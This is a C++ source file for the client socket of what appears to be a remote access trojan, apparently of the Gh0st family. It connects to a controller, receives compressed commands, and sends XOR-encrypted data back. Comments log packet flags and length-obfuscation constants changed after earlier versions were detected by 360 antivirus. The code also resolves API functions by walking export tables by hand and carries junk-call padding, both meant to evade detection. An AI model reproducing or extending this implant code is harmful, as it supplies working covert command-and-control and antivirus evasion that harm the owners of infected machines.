// ClientSocket.cpp: implementation of the CClientSocket class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "KeyboardManager.h"
#include "ClientSocket.h"

#include "Manager.h"
#include "until.h"
#include "zlib.h"

#include "Log.h"

//#include "vld.h"

//#pragma comment(lib, "zlib-1.1.4.lib")
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

#define TSP_MAX_PACKET_LEN 0x00100000

#define  Key 0x2a

int BitManipulation( unsigned char* instr, int instrlen,unsigned char* outstr)
{
	for (int i=0;i<instrlen;i++)  //异或操作
	{
		{
			outstr[i]=instr[i]^Key;
		}

	}
	return 0;

}




CClientSocket::CClientSocket()
{
	
	GetForegroundWindow();
	
	WSADATA wsaData;
 	WSAStartup(MAKEWORD(2, 2), &wsaData);
	bSendLogin = TRUE;
	

	m_hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	m_bIsRunning = FALSE;
	bSendLogin = TRUE;
	m_Socket = INVALID_SOCKET;
	m_hWorkerThread=0;

	dwHeartTime=0;
	// Packet Flag;
	//BYTE bPacketFlag[] = {'C', 'F', 'Y', 'T', 'T'};  //20140918 //之前的CFWW6不能用
	// BYTE bPacketFlag[] = {'L', 'Y', 'S', 'B', 'D'};  //20140918 //之前的CFWW6不能用
	// BYTE bPacketFlag[] = {'D', 'Z', 'B','S', 'G', 'D'};  //20141112 //之前的CFWW6不能用
	// BYTE bPacketFlag[] = {'A', 'B', 'C','D','E','U', 'V','W','X','Y'};  //20140918 //之前的CFWW6不能用
	 BYTE bPacketFlag[] = {'2', '0', '1','5','0','7', '2','4','X','X'};  //20150724 xiangzw修改，解决


	memcpy(m_bPacketFlag, bPacketFlag, sizeof(bPacketFlag));
}

CClientSocket::~CClientSocket()
{
	
	//SC_HANDLE hSCM =  OpenSCManager( NULL, NULL, SC_MANAGER_CREATE_SERVICE );

	m_bIsRunning = FALSE;
	bSendLogin = FALSE;
	closesocket(m_Socket);
	WaitForSingleObject(m_hWorkerThread, INFINITE);

	//CloseServiceHandle(hSCM);

	if (m_Socket != INVALID_SOCKET)
	{
		Disconnect();
	}
// 	__asm
// 	{
// 		push eax;
// 		nop;
// 		pop eax;
// 		xchg ah,al;
// 		xchg al,ah;
// 	}	

// 	typedef	 BOOL (WINAPI *pCloseHandle)(HANDLE hObject );
// 	HMODULE hKernel = ::GetModuleHandle("Kernel32.dll");
// 	if (NULL == hKernel) 
// 	{
// 		return;
// 	}
// 
// 	pCloseHandle myColseHandle = (pCloseHandle)GetProAddress(hKernel, "CloseHandle");
// 	if (NULL == myColseHandle)
// 	{
// 		return;
// 	}
// 	
//	CloseHandle(m_hWorkerThread);
 	//ColseHandle(m_hWorkerThread);
// 	__asm
// 	{
// 		push eax;
// 		nop;
// 		pop eax;
// 		xchg ah,al;
// 		xchg al,ah;
// 	}
 	CloseHandle(m_hEvent);

	WSACleanup();	
}



DWORD CClientSocket::GetProAddress( HMODULE phModule,char* pProcName )
{
	if (!phModule) return 0;
	PIMAGE_DOS_HEADER pimDH = (PIMAGE_DOS_HEADER)phModule;
	PIMAGE_NT_HEADERS pimNH = (PIMAGE_NT_HEADERS)((char*)phModule+pimDH->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY pimED = (PIMAGE_EXPORT_DIRECTORY)((DWORD)phModule+pimNH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	DWORD pExportSize = pimNH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
	DWORD pResult = 0;
	if ((DWORD)pProcName < 0x10000)
	{
		if ((DWORD)pProcName >= pimED->NumberOfFunctions+pimED->Base || (DWORD)pProcName < pimED->Base) return 0;
		pResult = (DWORD)phModule+((DWORD*)((DWORD)phModule+pimED->AddressOfFunctions))[(DWORD)pProcName-pimED->Base];
	}
	else
	{
		DWORD* pAddressOfNames = (DWORD*)((DWORD)phModule+pimED->AddressOfNames);
		for (unsigned long i=0;i < pimED->NumberOfNames ; i++)
		{
			char* pExportName = (char*)(pAddressOfNames[i]+(DWORD)phModule);
			if (lstrcmpi(pProcName,pExportName) == 0)
			{
				WORD* pAddressOfNameOrdinals = (WORD*)((DWORD)phModule+pimED->AddressOfNameOrdinals);
				pResult  = (DWORD)phModule+((DWORD*)((DWORD)phModule+pimED->AddressOfFunctions))[pAddressOfNameOrdinals[i]];
				break;
			}
		}
	}
	if (pResult != 0 && pResult >= (DWORD)pimED && pResult < (DWORD)pimED+pExportSize)
	{
		char* pDirectStr = (char*)pResult;
		BOOL pstrok = FALSE;
		while (*pDirectStr)
		{
			if (*pDirectStr == '.')
			{
				pstrok = TRUE;
				break;
			}
			pDirectStr++;
		}
		if (!pstrok) return 0;
		char pdllname[MAX_PATH];
		int  pnamelen = pDirectStr - (char*)pResult;
		if (pnamelen <= 0) return 0;
		memcpy(pdllname,(char*)pResult,pnamelen);
		pdllname[pnamelen] = 0;
		HMODULE phexmodule = GetModuleHandleA(pdllname);
		pResult = GetProAddress(phexmodule,pDirectStr+1);
	}
	return pResult;
}

BOOL CClientSocket::Connect(LPCTSTR lpszHost, UINT nPort)
{
	
	

// 	__try
// 	{
// 		StartService(NULL,NULL,NULL);
// 	}
// 	__finally
// 	{
// 		__asm nop;
		// 一定要清除一下，不然socket会耗尽系统资源
		Disconnect();
// 	}
// 	// 重置事件对像

	
	
	ResetEvent(m_hEvent);
	m_bIsRunning = FALSE;
	bSendLogin = FALSE;
	
// 	if (m_hWorkerThread)
// 	{
// 		WaitForSingleObject(m_hWorkerThread,INFINITE);
// 		CloseHandle(m_hWorkerThread);
// 	}
	
	
	
	m_Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 

	if (m_Socket == SOCKET_ERROR)   
	{ 
		return FALSE;   
	}

	hostent* pHostent = NULL;

	pHostent = gethostbyname(lpszHost);

	if (pHostent == NULL)
		return FALSE;
	
	// 构造sockaddr_in结构
	sockaddr_in	ClientAddr;
	ClientAddr.sin_family	= AF_INET;

	ClientAddr.sin_port	= htons((USHORT)nPort);

	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);

	if (connect(m_Socket, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR)   
		return FALSE;
// 禁用Nagle算法后，对程序效率有严重影响
// The Nagle algorithm is disabled if the TCP_NODELAY option is enabled 
//   const char chOpt = 1;
// 	int nErr = setsockopt(m_Socket, IPPROTO_TCP, TCP_NODELAY, &chOpt, sizeof(char));

	// 验证socks5服务器
//	if (m_nProxyType == PROXY_SOCKS_VER5 && !ConnectProxyServer(lpszHost, nPort))
//	{
//		return FALSE;
//	}
	// 不用保活机制，自己用心跳实瑞
	
	
	
	//WSANOTINITIALISED

	const char chOpt = 1; // TRUE
	// Set KeepAlive 开启保活机制, 防止服务端产生死连接
	if (setsockopt(m_Socket, SOL_SOCKET, SO_KEEPALIVE, (char *)&chOpt, sizeof(chOpt)) == 0)
	{
		// 设置超时详细信息
		tcp_keepalive	klive;
		klive.onoff = 1; // 启用保活
		klive.keepalivetime = 1000 * 30;//60 * 3; // 3分钟超时 Keep Alive
		klive.keepaliveinterval = 1000 * 5; // 重试间隔为5秒 Resend if No-Reply
		DWORD cbBytesReturned;
		WSAIoctl
			(
			m_Socket, 
			SIO_KEEPALIVE_VALS,
			&klive,
			sizeof(tcp_keepalive),
			NULL,
			0,
			(unsigned long *)&cbBytesReturned,
			0,
			NULL
			);
	}	
	
	m_bIsRunning = TRUE;
	bSendLogin = TRUE;
	m_hWorkerThread = (HANDLE)(HANDLE)CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL);

	CloseHandle(m_hWorkerThread);

	m_hWorkerThread = (HANDLE)MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL, TRUE);
	
	return TRUE;
}

DWORD WINAPI CClientSocket::WorkThread(LPVOID lparam)   
{
	
	
	
	CClientSocket *pThis = (CClientSocket *)lparam;
	char	buff[MAX_RECV_BUFFER];
	fd_set fdSocket;
	FD_ZERO(&fdSocket);
	FD_SET(pThis->m_Socket, &fdSocket);
	
	
	
	while (pThis->IsRunning())
	{
		fd_set fdRead = fdSocket;
		int nRet = select(NULL, &fdRead, NULL, NULL, NULL);
		
		
		if (nRet == SOCKET_ERROR)
		{
			break;
		}
		if (nRet > 0)
		{
			memset(buff, 0, sizeof(buff));
			int nSize = recv(pThis->m_Socket, buff, sizeof(buff), 0);
		//	printf("recv接受的字节数大小 %d\n",nSize);
			if (nSize <= 0)
			{

 				break;
			}
			if (nSize > 0) pThis->OnRead((LPBYTE)buff, nSize);
		}
	}
// 	pThis->Disconnect();
// 	CloseHandle(pThis->m_hWorkerThread);
// 	pThis->m_hWorkerThread=0;

	return -1;
}

DWORD CClientSocket::run_event_loop(DWORD dwTime)
{
	
	return WaitForSingleObject(m_hEvent, dwTime);
}

BOOL CClientSocket::IsRunning()
{
	
	
	
	return m_bIsRunning;
}

void CClientSocket::OnRead( LPBYTE lpBuffer, DWORD dwIoSize )
{	
	//try
	//printf("OnRead 传入字节数 %d\n",dwIoSize);
	{
		if (dwIoSize == 0)
		{
			Disconnect();
			return;
		}
		if (dwIoSize == FLAG_SIZE && memcmp(lpBuffer, m_bPacketFlag, FLAG_SIZE) == 0)
		{
			// 重新发送	
			Send(m_ResendWriteBuffer.GetBuffer(), m_ResendWriteBuffer.GetBufferLen());
			return;
		}
		// Add the message to out message
		// Dont forget there could be a partial, 1, 1 or more + partial mesages
		m_CompressionBuffer.Write(lpBuffer, dwIoSize);

		
		// Check real Data
		while (m_CompressionBuffer.GetBufferLen() > HDR_SIZE)
		{
			BYTE bPacketFlag[FLAG_SIZE];
			CopyMemory(bPacketFlag, m_CompressionBuffer.GetBuffer(), sizeof(bPacketFlag));
			
			memcmp(m_bPacketFlag, bPacketFlag, sizeof(m_bPacketFlag));
			
			DWORD nSize = 0;
			CopyMemory(&nSize, m_CompressionBuffer.GetBuffer(FLAG_SIZE), sizeof(int));

			// chengwei modify 2013.8,nSize值不正确导致下面内存分配失败，导致后面违规访问
			if( nSize <0 || nSize > TSP_MAX_PACKET_LEN )
				break;

			if (nSize && (m_CompressionBuffer.GetBufferLen()) >= nSize)
			{
				int nUnCompressLength = 0;
				// Read off header
				m_CompressionBuffer.Read((PBYTE) bPacketFlag, sizeof(bPacketFlag));
				m_CompressionBuffer.Read((PBYTE) &nSize, sizeof(int));
				m_CompressionBuffer.Read((PBYTE) &nUnCompressLength, sizeof(int));
				////////////////////////////////////////////////////////
				////////////////////////////////////////////////////////
				// SO you would process your data here
				// 
				// I'm just going to post message so we can see the data
				int	nCompressLength = nSize - HDR_SIZE;
				PBYTE pData = new BYTE[nCompressLength];

				// chengwei modify 2013.8
				if( !pData )
					break;

				PBYTE pDeCompressionData = new BYTE[nUnCompressLength];
				
				// chengwei modify 2013.8
				if( !pDeCompressionData )
				{
					delete [] pData;
					break;
				}


				m_CompressionBuffer.Read(pData, nCompressLength);
				
				//////////////////////////////////////////////////////////////////////////
				unsigned long	destLen = nUnCompressLength;
				int	nRet = uncompress(pDeCompressionData, &destLen, pData, nCompressLength);
				//////////////////////////////////////////////////////////////////////////
				if (nRet == Z_OK)
				{
					m_DeCompressionBuffer.ClearBuffer();
					m_DeCompressionBuffer.Write(pDeCompressionData, destLen);
					//__asm int 

					//printf("崩溃时的字节大小 %d\n", m_DeCompressionBuffer.GetBufferLen());
				//	printf("m_pManager 的地址%08x\n",&m_pManager);

					if (0  == (IsBadReadPtr(m_pManager,strlen((char *)m_pManager))))  //zhenyu 20140916 防止指针被改
					{
						m_pManager->OnReceive(m_DeCompressionBuffer.GetBuffer(0), m_DeCompressionBuffer.GetBufferLen());
					}
		
					//m_pManager->OnReceive(m_DeCompressionBuffer.GetBuffer(0), m_DeCompressionBuffer.GetBufferLen());

				}


				delete [] pData;
				delete [] pDeCompressionData;
			}
			else
				break;
		}
	}
	//catch(...)
	//{
	//	m_CompressionBuffer.ClearBuffer();
	//	Send(NULL, 0);
	//}
	
	

}

void CClientSocket::Disconnect()
{
    //
    // If we're supposed to abort the connection, set the linger value
    // on the socket to 0.
    //
    LINGER lingerStruct;
    lingerStruct.l_onoff = 1;
    lingerStruct.l_linger = 0;

//	SC_HANDLE hSCM =  OpenSCManager( NULL, NULL, SC_MANAGER_CREATE_SERVICE );
//	TCHAR szModule [MAX_PATH];
	setsockopt(m_Socket, SOL_SOCKET, SO_LINGER, (char *)&lingerStruct, sizeof(lingerStruct) );
//	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);

	if(!CancelIo((HANDLE) m_Socket))
	{
	}
	//CloseServiceHandle(hSCM);
	InterlockedExchange((LPLONG)&m_bIsRunning, FALSE);
	InterlockedExchange((LPLONG)&bSendLogin, FALSE);


	CKeyboardManager::Myclosesocket(m_Socket);
	//{
	//	__asm int 3
	//	dprintf(("%d",WSAGetLastError()));
	//}
	

	SetEvent(m_hEvent);
	dwHeartTime=0; //心跳包次数
	
	m_Socket = INVALID_SOCKET;
}

int CClientSocket::Send( LPBYTE lpData, UINT nSize )
{
	nm_ddc::CLockGuard<nm_ddc::CThreadMutex> guard(&m_lock);

	m_WriteBuffer.ClearBuffer();

	if (nSize > 0)
	{
		// Compress data
		unsigned long	destLen = (ULONG)((double)nSize * 1.001  + 12);
		GetTickCount();
		LPBYTE			pDest = new BYTE[destLen];

		if (pDest == NULL)
			return 0;

		

		int	nRet = compress(pDest, &destLen, lpData, nSize);

			
		if (nRet != Z_OK)
		{
			delete [] pDest;
			return -1;
		}

		////////压缩之后，简单加密一下


		BitManipulation(pDest,destLen,pDest);

		//////////////////加密结束
		

		//////////////////////////////////////////////////////////////////////////
		//LONG nBufLen = (destLen + HDR_SIZE)^0xff;

		//LONG nBufLen = ((destLen + HDR_SIZE)^0xA4) + 0xFF00;  //20140918 backup，这个不能用了，被360知道了

	//	LONG nBufLen = ((destLen + HDR_SIZE)^0xC9) + 0xED3C; //2014-11-07 失败

		//LONG nBufLen = ((destLen + HDR_SIZE)^0xB6) + 0xBC98; //2014-11-07 失败

		//LONG nBufLen = ((destLen + HDR_SIZE)^0xDD) + 0xDD34; //2014-11-12 失败
		LONG nBufLen = ((destLen + HDR_SIZE)^0xF4) + 0xFA97; //2014-11-07 失败

		// 5 bytes packet flag
		m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
		// 4 byte header [Size of Entire Packet]
		m_WriteBuffer.Write((PBYTE) &nBufLen, sizeof(nBufLen));
		// 4 byte header [Size of UnCompress Entire Packet]
		m_WriteBuffer.Write((PBYTE) &nSize, sizeof(nSize));
		// Write Data
		m_WriteBuffer.Write(pDest, destLen);
		delete [] pDest;
		
		// 发送完后，再备份数据, 因为有可能是m_ResendWriteBuffer本身在发送,所以不直接写入
		LPBYTE lpResendWriteBuffer = new BYTE[nSize];
		
		GetForegroundWindow();
		
		CopyMemory(lpResendWriteBuffer, lpData, nSize);

		GetForegroundWindow();

		m_ResendWriteBuffer.ClearBuffer();
		m_ResendWriteBuffer.Write(lpResendWriteBuffer, nSize);	// 备份发送的数据
		if (lpResendWriteBuffer)
			delete [] lpResendWriteBuffer;
	}
	else // 要求重发, 只发送FLAG
	{
		m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
		m_ResendWriteBuffer.ClearBuffer();
		m_ResendWriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));	// 备份发送的数据	
	}

	// 分块发送
	return SendWithSplit(m_WriteBuffer.GetBuffer(), m_WriteBuffer.GetBufferLen(), MAX_SEND_BUFFER);
}


int CClientSocket::SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize)
{
	int			nRet = 0;
	const char	*pbuf = (char *)lpData;
	UINT		size = 0;
	int			nSend = 0;
	int			nSendRetry = 15;
	// 依次发送
	for (size = nSize; size >= nSplitSize; size -= nSplitSize)
	{
		int i=0;
		for (i = 0; i < nSendRetry; i++)
		{
			nRet = send(m_Socket, pbuf, nSplitSize, 0);
			if (nRet > 0)
				break;
		}
		if (i == nSendRetry)
			return -1;
		
		nSend += nRet;
		pbuf += nSplitSize;
		Sleep(10); // 必要的Sleep,过快会引起控制端数据混乱
	}
	// 发送最后的部分
	if (size > 0)
	{
		int i=0;
		for (i = 0; i < nSendRetry; i++)
		{
			nRet = send(m_Socket, (char *)pbuf, size, 0);
			if (nRet > 0)
				break;
		}
		if (i == nSendRetry)
			return -1;
		nSend += nRet;
	}
	if (nSend == nSize)
		return nSend;
	else
		return SOCKET_ERROR;
}

void CClientSocket::SetManagerCallBack( CManager *pManager )
{
	m_pManager = pManager;
}
